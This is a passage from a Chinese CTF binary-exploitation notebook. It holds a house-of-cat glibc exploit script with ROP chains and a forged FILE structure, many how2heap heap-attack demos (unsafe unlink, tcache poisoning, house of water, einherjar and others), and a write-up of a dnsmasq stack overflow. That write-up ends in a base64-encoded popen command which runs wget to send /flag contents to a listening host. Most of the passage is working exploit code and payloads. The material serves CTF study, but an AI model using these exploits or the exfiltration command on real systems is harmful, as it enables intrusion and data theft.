bloom_elem_off = bloom_off + bloom_elem_idx * gnu_hash_section._xwordsize
bloom_elem_val = gnu_hash_section.params['bloom'][bloom_elem_idx]
bucket_elem_idx = namehash % gnu_hash_section.params['nbuckets']
bucket_elem_off = bucket_off + bucket_elem_idx * gnu_hash_section._wordsize
bucket_elem_val = gnu_hash_section.params['buckets'][bucket_elem_idx]
hasharr_off = gnu_hash_section._chain_pos + (bucket_elem_val - gnu_hash_section.params['symoffset']) * gnu_hash_section._wordsize
sym_off = dynsym_section['sh_offset'] + bucket_elem_val * dynsym_section['sh_entsize']

sym_value = b''
sym_value += p32(next(libc.search(b'exit\x00')) - dynstr_section['sh_offset']) # st_name
sym_value += p8(0x12) # st_info
sym_value += p8(0) # st_other
sym_value += p16(1) # st_shndx
sym_value += p64(one_gadget) # st_value
sym_value += p64(8) # st_size

edit(0, base_off + bloom_elem_off, p64(bloom_elem_val))
edit(0, base_off + bucket_elem_off, p32(bucket_elem_val))
edit(0, base_off + hasharr_off, p32(namehash))
edit(0, base_off + sym_off, sym_value)
sla(b"option:", 5)
```


#### house of cat 
适用范围：


利用原理：


利用链：

```c
__malloc_assert->__fxprintf->locked_vfxprintf->__vfprintf_interna->__vfprintf_internal
->_IO_wfile_seekoff->_IO_switch_to_wget_mode(_IO_WOVERFLOW)
```


````python
def login():
    sa("mew mew mew~~~~~~",'LOGIN | r00t QWB QWXFadmin')

def game():
    sa("mew mew mew~~~~~~",'CAT | r00t QWB QWXF'+'\xff'+'$')

def add(idx,size,con='a'):
    game()
    sla("plz input your cat choice:",1)
    sla("plz input your cat idx:",idx)
    sla("plz input your cat size:",size)
    p.sendafter("plz input your content:",con)

def dele(idx):
    game()
    sla("plz input your cat choice:",2)
    sla("plz input your cat idx:",idx)

def show(idx):
    game()
    sla("plz input your cat choice:",3)
    sla("plz input your cat idx:",idx)

def edit(idx,con):
    game()
    sla("plz input your cat choice:",4)
    sla("plz input your cat idx:",idx)
    p.sendafter("plz input your content:",con)


login()
add(0,0x420)
add(1,0x418)
add(2,0x418)

dele(0)
add(3,0x430)
show(0)
libc_base = l64()-0x21A0D0
lg('libc_base')
main_arena = libc_base+0x21A0D0
p.recv(10)
heap_base=u64(p.recv(6).ljust(8,'\x00'))-0x290
lg('heap_base')
#---------------------------------------------------------
setcontext = libc_base + libc.sym['setcontext'] + 61 
# Close = libc_base + libc.sym['close']
# Open = libc_base + libc.sym["open"]
Read = libc_base + libc.sym["read"]
Write = libc_base + libc.sym['write']
stderr = libc_base + libc.sym['stderr'] # *
IO_wfile_jumps = libc_base + 0x2160c0 # *
lg('IO_wfile_jumps')
pop_rdi = libc_base + 0x000000000002a3e5
pop_rsi = libc_base + 0x000000000002be51
pop_rdx_rbx = libc_base + 0x0000000000090529 
pop_rax = libc_base + 0x0000000000045eb0
syscall = libc_base + 0x0000000000091396
ret= libc_base + 0x0000000000029cd6


orw_addr = heap_base+0x17b0
fake_io_addr = heap_base+0xae0  # 伪造的fake_IO结构体的地址
flag = fake_io_addr+0x160

next_chain = 0
fake_IO_FILE  = p64(0xfbad1800) + p64(0) # _flag = '/bin/sh'/rdi
fake_IO_FILE += p64(0)*6
fake_IO_FILE += p64(1)+p64(2)
fake_IO_FILE += p64(fake_io_addr+0xb0) # _IO_backup_base = setcontext_rdx/rdx
fake_IO_FILE += p64(setcontext) # _IO_save_end = call addr(call setcontext)
fake_IO_FILE =  fake_IO_FILE.ljust(0x68, '\x00')
fake_IO_FILE += p64(0) # _chain
fake_IO_FILE =  fake_IO_FILE.ljust(0x88, '\x00')
fake_IO_FILE += p64(heap_base) # _lock = a writable address
fake_IO_FILE =  fake_IO_FILE.ljust(0xa0, '\x00')
fake_IO_FILE += p64(fake_io_addr+0x30) #_wide_data,rax1_addr
fake_IO_FILE =  fake_IO_FILE.ljust(0xc0, '\x00')
fake_IO_FILE += p64(1) # _mode = 1
fake_IO_FILE =  fake_IO_FILE.ljust(0xd8, '\x00')
fake_IO_FILE += p64(IO_wfile_jumps+0x10)  # vtable
fake_IO_FILE += p64(0)*6
fake_IO_FILE += p64(fake_io_addr+0x40)  # rax2_addr

fake_IO_FILE =  fake_IO_FILE.ljust(0x150,'\x00')
fake_IO_FILE += p64(orw_addr)+p64(ret)# fake_io_addr+0xb0+0xa0/0xa8
fake_IO_FILE += '/flag'.ljust(0x10, '\x00')

dele(2)# 因为题目只能edit 0x30/所以要重新申请
add(5,0x418,fake_IO_FILE[0x10:])

dele(2)
edit(0,p64(main_arena)*2+p64(0)+p64(stderr-0x20))
add(4,0x450)
#----------------------------------------------
# orw =  p64(pop_rdi)+p64(0)+p64(Close)# 限制了read的fd为0
# orw += p64(pop_rdi)+p64(flag)+p64(pop_rsi)+p64(0)+p64(Open)
orw += p64(pop_rax)+p64(2)+p64(pop_rdi)+p64(flag)+p64(pop_rsi)+p64(0)+p64(syscall)
orw += p64(pop_rdi)+p64(0)+p64(pop_rsi)+p64(fake_io_addr+0x200)+p64(pop_rdx_rbx)+p64(0x30)+p64(0)+p64(Read)
orw += p64(pop_rdi)+p64(1)+p64(Write)
add(6,0x450,orw)

# Largebinattack改topchunk位为小值
add(7,0x440)
add(8,0x430)
add(9,0x430)
dele(7)
add(10,0x450)
dele(9)
edit(7,p64(libc_base+0x21a0e0)*2+p64(0)+p64(heap_base+0x2d30+3-0x20))
game()
sla("plz input your cat choice:",1)
sla("plz input your cat idx:",15)
sla("plz input your cat size:",0x468)# Largebinattack 和 __malloc_assert

p.interactive()
````

### how2heap

变量本身理解为一个套壳
比如malloc返回一个地址，就是放进壳里边，壳和壳里的数据都是一体的

指针变量和数组变量有所不同，数组变量本身会被赋予其自己的首地址，使得实现test[1]就是内容位
即addr->test[0]（addr）->nil

#### 2.39

##### unsafe_unlink
注意不要使用fastbin和tcachebin
这里把上堆块称为0，下堆块称为1
向上合并+伪造上堆块 => 构造bss段上自循环指针 => 任意地址写
对上的这个堆的FD和BK做特殊处理就能把上的这个堆的FD的值写入自己+0x18的位置里边，形成自指针，实现任意地址读写

```c
int malloc_size = 0x420;
int header_size = 2;

chunk0_ptr = (uint64_t*) malloc(malloc_size); //chunk0
uint64_t *chunk1_ptr  = (uint64_t*) malloc(malloc_size); //chunk1

//在0号堆块下一行伪造chunk
chunk0_ptr[1] = chunk0_ptr[-1] - 0x10;
chunk0_ptr[2] = (uint64_t) &chunk0_ptr-(sizeof(uint64_t)*3);//FD
chunk0_ptr[3] = (uint64_t) &chunk0_ptr-(sizeof(uint64_t)*2);//BK

//修改1堆块的preive_size以及size位，体现0堆块的free
uint64_t *chunk1_hdr = chunk1_ptr - header_size;
chunk1_hdr[0] = malloc_size;
chunk1_hdr[1] &= ~1;
//向上合并
free(chunk1_ptr);
//此时&chunk0_ptr-> &chunk0_ptr-0x18(伪造的fd)
//构成自循环指针

//修改chunk0_ptr，给壳里放入目标地址，
char victim_string[8];
strcpy(victim_string,"Hello!~");
chunk0_ptr[3] = (uint64_t) victim_string;

//修改目标地址里的值
chunk0_ptr[0] = 0x4141414142424242LL;


assert(*(long *)victim_string == 0x4141414142424242L);
victim_string地址被写入BBBBAAAA

```


#####  tcache_stashing_unlink_attack

藏匿unlink，可以把任意地址放进tcache链表里
要至少一次calloc进行触发，要有覆写chunk到bk的能力(需要修改smallbinchunk的bk)
要一个可供布置的可写地址

```C
unsigned long stack_var[0x10] = {0};
unsigned long *chunk_lis[0x10] = {0};
unsigned long *target;

// stack_var[0]是0  stack_var[1]是size
// stack_var[2]是fd stack_var[3]是bk
stack_var[3] = (unsigned long)(&stack_var[2]);
//这样一来 bk+0x10 就是stack_var[4]会被放置一个libc地址，换句话说stack_var[2]需要是一个可写地址！！！


//now we malloc 9 chunks 
for(int i = 0;i < 9;i++){
	chunk_lis[i] = (unsigned long*)malloc(0x90);
}

// 为了防止0和2unsortbin的合并没有用连续的堆块，1和3-9 共7
for(int i = 3;i < 9;i++){
	free(chunk_lis[i]);
}
free(chunk_lis[1]);

//2个链接的unsortbinchunk 2->0
free(chunk_lis[0]);
free(chunk_lis[2]);

//扔到smallbin
malloc(0xa0);// size > 0x90

//申请2个tcache,为smallbin留空间
malloc(0x90);
malloc(0x90);

//修改2的bk指针指向fake_header（即要有修改bk指针的能力）
chunk_lis[2][1] = (unsigned long)stack_var;

//触发后，fake_chunk被放置到tcache头，同时其原本bk的值+0x10的地方写入一个libc地址
calloc(1,0x90);
target = malloc(0x90); 


assert(target == &stack_var[2]);
```


##### tcache_poisoning

```c
size_t stack_var[0x10];
size_t *target = NULL;

//申请一个对齐的地址作为目标地址，tcache返回的块必须正确对齐
for(int i=0; i<0x10; i++) {
	if(((long)&stack_var[i] & 0xf) == 0) {
		target = &stack_var[i];
		break;
	}
}

//个数要满足tcache规范
intptr_t *a = malloc(128);
intptr_t *b = malloc(128);
free(a);
free(b);
// b->a

b[0] = (intptr_t)((long)target ^ (long)b >> 12);
malloc(128)
intptr_t *c = malloc(128);
```

##### tcache_house_of_spirit


malloc.c in function \_int_free that tcache_put 被使用而没有检测nextchunksize和prev_inuse位，导致只用伪造一个size位就能被当作一个可free的堆块

```c
//设置好内存
malloc(1);

//伪造fake_chunk，事实上只伪造了一个size位
unsigned long long *a; //pointer that will be overwritten
unsigned long long fake_chunks[10]; //fake chunk region
fake_chunks[1] = 0x40; // this is the size
a = &fake_chunks[2];

free(a);
void *b = malloc(0x30);

assert((long)b == (long)&fake_chunks[2]);

```

##### sysmalloc_int_free

简单来说就是利用malloc来实现free

![image.png](https://e4l4pic.oss-cn-beijing.aliyuncs.com/20241225112752.png)

##### safe_link_double_protect

感觉主要是介绍tcache的指针加密的，用异或来解决


```c
void *a = malloc(0x38);
void *b = malloc(0x38);
void *c = malloc(0x18);
void *d = malloc(0x18);

// 堆上存放了目标地址
void *value = malloc(0x28);
*(long *)value = ((long)(goal) & ~(0xf));

free(a);
free(b);
free(c);
free(d);

// tcache struct 劫持0x40bins头节点为存放目标地址的堆块
void *metadata = (void *)((long)(value) & ~(0xfff));
*(unsigned int*)(metadata+0xa0) = (long)(metadata)+((long)(value) & (0xfff));

void *_ = malloc(0x38);
// tcache struct 劫持0x20bins头节点为0x40bins头节点位置
*(unsigned int*)(metadata+0x90) = (long)(metadata)+0xa0;

// 在0x20bins里 value -> goal
_ = malloc(0x18);
char *vuln = malloc(0x18);

strcpy(vuln, "XXXXXXXXXXX HIJACKED!");
assert(strcmp(goal, "Replace me!") != 0);
```

##### poison_null_byte

这里粘连的fd和bk都是自然指向头的

![image.png](https://e4l4pic.oss-cn-beijing.aliyuncs.com/img/26177342-3385e98bb1814af0.png)

```c
//分配掉padding使得 fake chunk's addresses's lowest 2nd byte is \x0
void *tmp = malloc(0x1);
void *heap_base = (void *)((long)tmp & (~0xfff));
size_t size = 0x10000 - ((long)tmp&0xffff) - 0x20;
void *padding= malloc(size);

//a 比prev小一点，b大一点
void *prev = malloc(0x500);
void *victim = malloc(0x4f0);
malloc(0x10);
void *a = malloc(0x4f0);
malloc(0x10);
void *b = malloc(0x510);
malloc(0x10);

//进larbin重新排序
free(a);
free(b);
free(prev);
malloc(0x1000);

//粘连fdnext和bknext后申请出来，设置victim的prevsize
void *prev2 = malloc(0x500);
((long *)prev)[1] = 0x501;
*(long *)(prev + 0x500) = 0x500;

//为b设置FD
void *b2 = malloc(0x510);
((char*)b2)[0] = '\x10';
((char*)b2)[1] = '\x00';  // b->fd <- fake_chunk

//为a设置BK， a->bck points to victim 借这个地址进行处理
void *a2 = malloc(0x4f0);
free(a2);
free(victim);
void *a3 = malloc(0x4f0);
((char*)a3)[8] = '\x10';
((char*)a3)[9] = '\x00';

//改victim的size位，向上合并
void *victim2 = malloc(0x4f0);
((char *)victim2)[-8] = '\x00';
free(victim);

//合并完后进unsortbin，直接切割就是fakechunk的位置
void *merged = malloc(0x100);
memset(merged, 'A', 0x80)
memset(prev2, 'C', 0x80);

assert(strstr(merged, "CCCCCCCCC"));
```


##### overlapping_chunks

直接修改size导致溢出的列子

```c
long *p1,*p2,*p3,*p4;
p1 = malloc(0x80 - 8);
p2 = malloc(0x500 - 8);
p3 = malloc(0x80 - 8);

memset(p1, '1', 0x80 - 8);
memset(p2, '2', 0x500 - 8);
memset(p3, '3', 0x80 - 8);

int evil_chunk_size = 0x581;
int evil_region_size = 0x580 - 8;

*(p2-1) = evil_chunk_size; // we are overwriting the "size" field of chunk p2
free(p2);
p4 = malloc(evil_region_size);

memset(p4, '4', evil_region_size);
memset(p3, '3', 80);
assert(strstr((char *)p4, (char *)p3));

```

##### mmap_overlapping_chunks

mmapchunk不使用fd和bk

```c
/*
================================================
running program
heap
....
third mmap chunk
second mmap chunk
LibC
....
ld
first mmap chunk
===============================================
*/
int* ptr1 = malloc(0x10);

long long* top_ptr = malloc(0x100000);
long long* mmap_chunk_2 = malloc(0x100000);
long long* mmap_chunk_3 = malloc(0x100000);

//修改size位为2+3的大小
mmap_chunk_3[-1] = (0xFFFFFFFFFD & mmap_chunk_3[-1]) + (0xFFFFFFFFFD & mmap_chunk_2[-1]) | 2;

free(mmap_chunk_3);

//在3的上面
long long* overlapping_chunk = malloc(0x300000);
int distance = mmap_chunk_2 - overlapping_chunk;
overlapping_chunk[distance] = 0x1122334455667788;
assert(mmap_chunk_2[0] == overlapping_chunk[distance]);
```

##### house_of_water


在tachemeta里构造fakechunk

程序存在UAF漏洞
程序可以申请住够大的堆块

不需要泄露任何内存地址且不需要任何堆上的溢出


```c
//在tcache meta里对于大小数量的位置增1，得到一个0x0000000000010001
void *fake_size_lsb = malloc(0x3d8);
void *fake_size_msb = malloc(0x3e8);
free(fake_size_lsb);
free(fake_size_msb);

//准备好用来填充0x90bins的堆块
void *metadata = (void *)((long)(fake_size_lsb) & ~(0xfff));
void *x[7];
for (int i = 0; i < 7; i++) {
	x[i] = malloc(0x88);
}

//准备好三个用于放入unsortbin的0x90堆块
void *unsorted_start = malloc(0x88);
_ = malloc(0x18); // Guard chunk
void *unsorted_middle = malloc(0x88);
_ = malloc(0x18); // Guard chunk
void *unsorted_end = malloc(0x88);
_ = malloc(0x18); // Guard chunk


//设置好fakechunk0x10001的下个堆块的prev_size和in_use
//0x000055f9225aa080+0x10000=0x000055f9225ba080==nextchunk_header==endoffake_content
_ = malloc(0xf000);
void *end_of_fake = malloc(0x18); // Metadata chunk
*(long *)end_of_fake = 0x10000;
*(long *)(end_of_fake+0x8) = 0x20;

//填满0x90bins
for (int i = 0; i < 7; i++) {
	free(x[i]);
}

//接下来伪造fakechunk的fd和bk，分别对应了0x20和0x30的首个块的地址
*(long*)(unsorted_start-0x18) = 0x31; 
free(unsorted_start-0x10);
*(long*)(unsorted_start-0x8) = 0x91;//恢复size

*(long*)(unsorted_end-0x18) = 0x21; 
free(unsorted_end-0x10);
*(long*)(unsorted_end-0x8) = 0x91; //恢复size


free(unsorted_end);
free(unsorted_middle);
free(unsorted_start);
/*
        - Unsorted bin:
                unsorted_start <--> unsorted_middle <--> unsorted_end
                0x55f9225aae50 <--> 0x55f9225aaf00 <--> 0x55f9225aafb0
        - 0x20 t-cache:
                * 0x55f9225aafb0
        - 0x30 t-cache
                * 0x55f9225aae50
*/

//start->fd->fakeheader
//end->bk->fakeheader
//等同于替换了unsortbin链表中unsorted_middle的位置唯一一个largebin，直接申请即可
*(unsigned long *)unsorted_start = (unsigned long)(metadata+0x80);
*(unsigned long *)(unsorted_end+0x8) = (unsigned long)(metadata+0x80);

//size在0x10000内
void *meta_chunk = malloc(0x288);


/*
0x000055f9225aa070              0x0000000000000000  0x0000000000000000
0x000055f9225aa080              0x0000000000000000  0x0000000000000291
0x000055f9225aa090              0x00007fc85b6db360  0x00007fc85b6db360
0x000055f9225aa0a0              0x000055f9225aa080  0x000055f9225aa080
*/
assert(meta_chunk == (metadata+0x90)); 


```

##### house_of_tangerine

注意要去除fencepost
5次malloc+3次oob或者BOF

```c

//heap_ptr = malloc(0x10);
//top_size = heap_ptr[3];//0x20d51

//切割topchunk,使得剩下部分后三位为我们需要的size，然后修改topchunksize位，后三位相同即可
size_2 = 0xce0
heap_ptr = malloc(size_2);
top_size_ptr = &heap_ptr[(size_2 / SIZE_SZ) - 1 + (MALLOC_ALIGN / SIZE_SZ)];
top_size = *top_size_ptr;
new_top_size = top_size & PAGE_MASK;
*top_size_ptr = new_top_size;
//被free的旧topchunksize还要减去FENCEPOST一般为0x20
freed_top_size = (new_top_size - FENCEPOST) & MALLOC_MASK;
heap_ptr = malloc(SIZE_3);

//-----------------------------------------------------------
//对新分配的一页同样的方式进行处理，已经分配过size_3的大小了
top_size = heap_ptr[(SIZE_3 / SIZE_SZ) + 1];//0x21061
new_top_size = top_size & PAGE_MASK;
heap_ptr[(SIZE_3 / SIZE_SZ) + 1] = new_top_size;
freed_top_size = (new_top_size - FENCEPOST) & MALLOC_MASK;
vuln_tcache = (size_t) &heap_ptr[(SIZE_3 / SIZE_SZ) + 2];
heap_ptr = malloc(SIZE_3);

//-----------------------------------------------------------
//得到2个0x40的tcachechunk，修改fd劫持
heap_ptr[(vuln_tcache - (size_t) heap_ptr) / SIZE_SZ] = target ^ (vuln_tcache >> 12);

heap_ptr = malloc(SIZE_1);
heap_ptr = malloc(SIZE_1);
 assert((size_t) heap_ptr == target);

```

#####  house_of_spirit

```c
//准备填满0x40bins的tcache
void *chunks[7];
for(int i=0; i<7; i++) {
	chunks[i] = malloc(0x30);
}
for(int i=0; i<7; i++) {
	free(chunks[i]);
}

//在目标位置伪造chunk，要伪造2个，第二个不需要fastbin大小，fastbin在释放时会校验nextchunksize忽略prev_size位，以及是否为当前bin链表头节点
long fake_chunks[10] __attribute__ ((aligned (0x10)));
fake_chunks[1] = 0x40; // this is the size
fake_chunks[9] = 0x1234; // nextsize

void *victim = &fake_chunks[2];
free(victim);

//calloc不分配tcache空闲块，用malloc也可以但得用8次
void *allocated = calloc(1, 0x30);
assert(allocated == victim);

```

#####  house_of_mind_fastbin（跳）

```c
int HEAP_MAX_SIZE = 0x4000000;
int MAX_SIZE = (128*1024) - 0x100;

uint8_t* fake_arena = malloc(0x1000); 
uint8_t* target_loc = fake_arena + 0x30;
uint8_t* target_chunk = (uint8_t*) fake_arena - 0x10;

fake_arena[0x888] = 0xFF;
fake_arena[0x889] = 0xFF; 
fake_arena[0x88a] = 0xFF;

uint64_t new_arena_value = (((uint64_t) target_chunk) + HEAP_MAX_SIZE) & ~(HEAP_MAX_SIZE - 1);
uint64_t* fake_heap_info = (uint64_t*) new_arena_value;

uint64_t* user_mem = malloc(MAX_SIZE);

while((long long)user_mem < new_arena_value){
	user_mem = malloc(MAX_SIZE);
}


uint64_t* fastbin_chunk = malloc(0x50); // Size of 0x60
uint64_t* chunk_ptr = fastbin_chunk - 2; // Point to chunk instead of mem

uint64_t* tcache_chunks[7];
for(int i = 0; i < 7; i++){
	tcache_chunks[i] = malloc(0x50);
}	
for(int i = 0; i < 7; i++){
	free(tcache_chunks[i]);
}
fake_heap_info[0] = (uint64_t) fake_arena; // Setting the fake ar_ptr (arena)

chunk_ptr[1] = 0x60 | 0x4; 
free(fastbin_chunk);

assert(*((unsigned long *) (target_loc)) != 0);

```


##### house_of_lore

通过修改smallbinchunk的bk指针，再申请回来，会使得其bk链上的堆块被放入tcache，用于劫持栈地址
smallbin链指针指向的都是header头部

```c
intptr_t* stack_buffer_1[4] = {0};
intptr_t* stack_buffer_2[4] = {0};
void* fake_freelist[7][4];
intptr_t *victim = malloc(0x100);

//用于填充tcache
void *dummies[7];
for(int i=0; i<7; i++) dummies[i] = malloc(0x100);
intptr_t *victim_chunk = victim-2;//拿chunkheader头的地址

//在栈上构造BK指针链，fake_freelist[i]指向header头
for(int i=0; i<6; i++) {
fake_freelist[i][3] = fake_freelist[i+1];
}
fake_freelist[6][3] = NULL;

//绕过检查，进一步设置双向链，主要是fd要指回smallbinchunk
stack_buffer_1[0] = 0;
stack_buffer_1[1] = 0;
stack_buffer_1[2] = victim_chunk;//fd指针
stack_buffer_1[3] = (intptr_t*)stack_buffer_2;//bk指针

stack_buffer_2[2] = (intptr_t*)stack_buffer_1;//fd指针
stack_buffer_2[3] = (intptr_t *)fake_freelist[0];//bk指针


//防止victim和topchunk合并
void *p5 = malloc(1000);

//将victim_chunk塞入smallbin
for(int i=0; i<7; i++) free(dummies[i]);
free((void*)victim);
void *p2 = malloc(1200);


//！！！漏洞点，设置smallbinchunk——>bk指向BK链
victim[1] = (intptr_t)stack_buffer_1; // victim->bk is pointing to stack


//申请回来
for(int i=0; i<7; i++) malloc(0x100);
void *p3 = malloc(0x100);//victimchunk
//这里bk链就会被放入tcache
char *p4 = malloc(0x100);//stack_addr_tcachechunk

//计算与栈底的偏移劫持返回地址
intptr_t sc = (intptr_t)jackpot; // Emulating our in-memory shellcode
long offset = (long)__builtin_frame_address(0) - (long)p4;
memcpy((p4+offset+8), &sc, 8); // This bypasses stack-smash detection since it jumps over the canary

// sanity check
assert((long)__builtin_return_address(0) == (long)jackpot);
```

##### house_of_einherjar


本质上offbynull高版本向上合并，注意check

```c
//获取对齐的栈地址
intptr_t stack_var[0x10];
intptr_t *target = NULL;
for(int i=0; i<0x10; i++) {
	if(((long)&stack_var[i] & 0xf) == 0) {
		target = &stack_var[i];
		break;
	}
}

//构造a/b/c格式
//a把指针指向自己来绕过检查
intptr_t *a = malloc(0x38);
a[0] = 0;	// prev_size (Not Used)
a[1] = 0x60; // size
a[2] = (size_t) a; // fwd
a[3] = (size_t) a; // bck

//b用来启动tcache poison
uint8_t *b = (uint8_t *) malloc(0x28);
int real_b_size = malloc_usable_size(b);//0x28
uint8_t *c = (uint8_t *) malloc(0xf8);
uint64_t* c_size_ptr = (uint64_t*)(c - 8);

// VULNERABILITY
b[real_b_size] = 0;
// VULNERABILITY

//修改c的prevsize和a的size，fake_chunksize == 0x60
size_t fake_size = (size_t)((c - sizeof(size_t) * 2) - (uint8_t*) a);
*(size_t*) &b[real_b_size-sizeof(size_t)] = fake_size;//prev_size
a[1] = fake_size;


//fill tcache
intptr_t *x[7];
for(int i=0; i<sizeof(x)/sizeof(intptr_t*); i++) {
	x[i] = malloc(0xf8);
}
for(int i=0; i<sizeof(x)/sizeof(intptr_t*); i++) {
	free(x[i]);
}
free(c);//大合并进unsortbin

//申请出来，后续就是tcachepoison
intptr_t *d = malloc(0x158);
uint8_t *pad = malloc(0x28);
free(pad);
free(b);
//改fd
d[0x30 / 8] = (long)target ^ ((long)&d[0x30/8] >> 12);

malloc(0x28);
intptr_t *e = malloc(0x28);
assert(e == target);

```

##### house_of_botcake


本来free掉的堆块即便在unsortbin里，也不能再次free
在其上方也free一个堆块使得他们合并，这样就能再次free进入tcache

```c

//准备一个栈地址
intptr_t stack_var[4];
//用于填充tcache的堆
intptr_t *x[7];
for(int i=0; i<sizeof(x)/sizeof(intptr_t*); i++){
	x[i] = malloc(0x100);
}

//2个大小互补的堆块
intptr_t *prev = malloc(0x100);
intptr_t *a = malloc(0x100);
malloc(0x10);

//填充tcache
for(int i=0; i<7; i++){
	free(x[i]);
}

//free2个堆块到unsortbin合并，此时合并到prev
free(a);
free(prev);

//再申请一个tcache，将a再次free
malloc(0x100);
/*VULNERABILITY*/
free(a);// a is already freed
/*VULNERABILITY*/


//此时tcache和unsortBin里都有a
int prev_size = prev[-1] & 0xff0;//0x220
int a_size = a[-1] & 0xff0;//0x110

a = malloc(0x100);
memset(a, 0, 0x100);
prev[0x110/sizeof(intptr_t)] = 0x41414141;//a的prevsize位
assert(a[0] == 0x41414141);
```


##### fastbin_reverse_into_tcache

```c

const size_t allocsize = 0x40;

char* ptrs[14];
size_t i;
for (i = 0; i < 14; i++) {
	ptrs[i] = malloc(allocsize);
}

// Fill the tcache.
for (i = 0; i < 7; i++) free(ptrs[i]);

char* victim = ptrs[7];
free(victim);

// Fill the fastbin.
for (i = 8; i < 14; i++) free(ptrs[i]);

size_t stack_var[6];
memset(stack_var, 0xcd, sizeof(stack_var));

//------------VULNERABILITY-----------

// Overwrite linked list pointer in victim.
// The following operation assumes the address of victim is known, thus requiring
// a heap leak.
*(size_t**)victim = (size_t*)((long)&stack_var[0] ^ ((long)victim >> 12));//FD指针
//------------------------------------
// Empty tcache.
for (i = 0; i < 7; i++) ptrs[i] = malloc(allocsize);


//再申请一个，fastbin里的chunk被倒入tcachebin
malloc(allocsize);
char *q = malloc(allocsize);
assert(q == (char *)&stack_var[2]);

```

##### fastbin_dup_into_stack

fastbin下的doublefree

```c
void *ptrs[7];

//填充tcache
for (int i=0; i<7; i++) {
	ptrs[i] = malloc(8);
}
for (int i=0; i<7; i++) {
	free(ptrs[i]);
}

//申请三个堆块，释放到fastbin
int *a = calloc(1,8);
int *b = calloc(1,8);
int *c = calloc(1,8);

//由于fastbin释放检测fastbin链表头部堆块，所以间隔doublefree
free(a);
free(b);
free(a);

//申请回a
unsigned long *d = calloc(1,8);
calloc(1,8)//b

stack_var[1] = 0x20;//伪造size

unsigned long ptr = (unsigned long)stack_var;
unsigned long addr = (unsigned long) d;
/*VULNERABILITY*/
*d = (addr >> 12) ^ ptr;//修改fastbinchunkFD指针
/*VULNERABILITY*/

calloc(1,8)
void *p = calloc(1,8);
assert((unsigned long)p == (unsigned long)stack_var + 0x10);

```

##### fastbin_dup

和上面一样的，dup，意思是doublefree use poison? duplication

```c
void *ptrs[8];
for (int i=0; i<8; i++) {
	ptrs[i] = malloc(8);
}
for (int i=0; i<7; i++) {
	free(ptrs[i]);
}

int *a = calloc(1, 8);
int *b = calloc(1, 8);
int *c = calloc(1, 8);

free(a);
free(b);
free(a);

a = calloc(1, 8);
b = calloc(1, 8);
c = calloc(1, 8);

assert(a == c);
```

##### fastbin_dup_consolidate

```c
void *ptr[7];

for(int i = 0; i < 7; i++)
	ptr[i] = malloc(0x40);
for(int i = 0; i < 7; i++)
	free(ptr[i]);

void* p1 = calloc(1,0x40);
free(p1);

//malloc_consolidate we need to allocate a chunk with large chunk size (>= 0x400)
void* p3 = malloc(0x400);
//malloc_consolidate will merge the fast chunk p1 with top.
assert(p1 == p3);

free(p1); // vulnerability
void *p4 = malloc(0x400);
assert(p4 == p3);
```

## Pwn challenge 🤺

### 2022ACTF master_of_dns

![image.png](https://e4l4pic.oss-cn-beijing.aliyuncs.com/20231227155042.png)

题目起了一个dns服务器，通过idaf12搜索版本号可以知道版本为
![image.png](https://e4l4pic.oss-cn-beijing.aliyuncs.com/20231227155141.png)

下载一个dnsmasq进行编译，这里还要注意编译的gcc版本
![image.png](https://e4l4pic.oss-cn-beijing.aliyuncs.com/20231227155352.png)

```
wget https://thekelleys.org.uk/dnsmasq/dnsmasq-2.86.tar.gz
tar -zxvf dnsmasq-2.86.tar.gz
cd dnsmasq-2.86
添加
# CFLAGS        = -m32 -fno-stack-protector
# LDFLAGS       = -m32 -no-pie
make
```

编译好了以后用ida进行binddiff，选择相似度不为百分之百的函数进行查看，其中extract_name函数中，题目给的版本多了一个memcpy函数，由于没有PIE，我们直接下断点，看它的参数
![image.png](https://e4l4pic.oss-cn-beijing.aliyuncs.com/20231227155509.png)

![image.png](https://e4l4pic.oss-cn-beijing.aliyuncs.com/20231227155645.png)


![image.png](https://e4l4pic.oss-cn-beijing.aliyuncs.com/20231227132854.png)

结合IDA看栈是0x381+4=0x385的溢出，同时溢出的n是有限制的，但是任然满足栈溢出条件

![image.png](https://e4l4pic.oss-cn-beijing.aliyuncs.com/20231227155756.png)

编写脚本确认溢出，由于不知道报文的具体发送方式，常规思路可能会选择逆向报文，但这里可以用winshark抓包(这里UDP BP感觉应该抓不了)
```shell
dig @127.0.0.1 -p 9999 baidu.com
```

由于本地服务起在127.0.0.1上，监听lo即可，很快就抓到了报文，但是数据包时data格式，这里右键data，选择协议首选项
![image.png](https://e4l4pic.oss-cn-beijing.aliyuncs.com/20231227160517.png)

然后就能正常识别了，观察查询请求的包，由于溢出部分只是域名部分，这里我们主要关注域名
这个包里必须字段为Domain Name System这个段
在dns请求报文中，域名字段，通过"."分隔开，点与点之间的字符个数必须<=0x3f
而且会把baidu.com其中的点拆成长度 \x05 baidu \x03 com \x00
我们保留这一段的头尾，就替换域名部分，'\x3f'+'a'\*0x3f为一段，共长0x40，我们给0x10试试
![image.png](https://e4l4pic.oss-cn-beijing.aliyuncs.com/20231227160536.png)

确认能溢出后，进一步调整长度0x385，尝试控制执行流到beef

```python

head = "24b401200001000000000001".decode("hex")
payload = ("\x3f"+'a'*0x3f)*14+"\x04aaaa"
payload += "\x04beef"

end =  '\x00'+"00010001".decode("hex")

s(head+payload+end)
```

也没问题，接下来就是如何带flag回来了，这里是UDP，再一个ORW确实麻烦。这里考虑用system或者popen执行反弹shell语句。这里利用wget去获取127.0.0.1/flag{xxx}，然后另一端在80端口监听即可拿到结果

```python
# cmd = b'wget `echo -e "%s"`/`cat /flag`' % (vps.replace(b'.',b'\\x2e'))
cmd = b"echo d2dldCAxMjcuMC4wLjEvYGNhdCAvZipgCg== | base64 -d | sh"
# wget 127.0.0.1/`cat /f*`


nc -l 80

➜  attachment sudo nc -l 80
GET /flag%7Bpwnbye4l4%7D HTTP/1.1
User-Agent: Wget/1.20.3 (linux-gnu)
Accept: */*
Accept-Encoding: identity
Host: 127.0.0.1
Connection: Keep-Alive
Connection: Keep-Alive

```

程序里正好有popen函数，然后就是找gadget给参数赋值
+ popen的2个参数必须都是字符串，"r"有了，但是cmd还没有
+ 不能有空字符

```c
.text:08071802 52                            push    edx                             ; modes
.text:08071803 50                            push    eax                             ; command
.text:08071804 E8 37 93 FD FF                call    _popen
```

观察crash时的栈状态
edx为memcpy赋值栈地址的开始，但edx是第二个参数的赋值寄存器，只需要"r"，不需要我们输入，而eax我们缺难以赋值为有效的地址(这里2个参数都是地址)，所以考虑使用gadget将edx的值赋值给eax

